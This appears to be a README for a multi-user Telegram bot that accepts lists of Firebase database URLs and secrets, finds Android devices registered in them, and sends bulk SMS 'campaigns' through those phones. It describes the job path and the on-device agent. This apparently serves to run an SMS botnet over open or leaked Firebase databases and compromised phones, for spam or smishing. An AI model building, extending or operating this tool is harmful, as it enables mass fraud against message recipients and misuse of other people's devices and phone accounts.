# Multi-User Automatic Telegram → Firebase SMS Bot (URL mode)

User provides **Firebase RTDB URLs only** (txt file). No service-account JSON.

```
Telegram  →  bot  →  REST  →  Firebase RTDB  →  Android device  →  SMS
```

## Input format (Step 1)

`.txt` one line per project:

```
https://myproj-default-rtdb.firebaseio.com
https://other-default-rtdb.firebaseio.com|DATABASE_SECRET
https://proj-default-rtdb.asia-southeast1.firebasedatabase.app SECRET
```

- Bare URL works if Realtime Database rules allow public read/write (testing).
- If rules require auth → append **Database Secret** after `|` or space.
  - Firebase Console → Project settings → Service accounts → Database secrets

## Flow

1. `/start` → upload URL list (or paste)
2. Bot scans `devices/` on each URL → reports online devices
3. Upload recipient numbers `.txt`
4. Send custom SMS body
5. Campaign: **5 SMS per online device**, then next device; progress bar; auto-stop

## Run

```bash
cd telegram-sms-bot
python3 -m venv venv && source venv/bin/activate
pip install -r requirements.txt
export TELEGRAM_BOT_TOKEN="123:ABC"
python bot.py
```

## Job path (Android)

```
devices/{deviceId}/sendSms/{jobId}
  to, body, status: "pending", createdAt, requestedBy, sim: 1
```

Use existing `AndroidSmsListener.java` or NEXUS agent.

## Config (`bot.py` top)

```python
SMS_PER_DEVICE = 5
ONLINE_WINDOW_MS = 5 * 60 * 1000
JOB_DELAY_SEC = 1.2
```
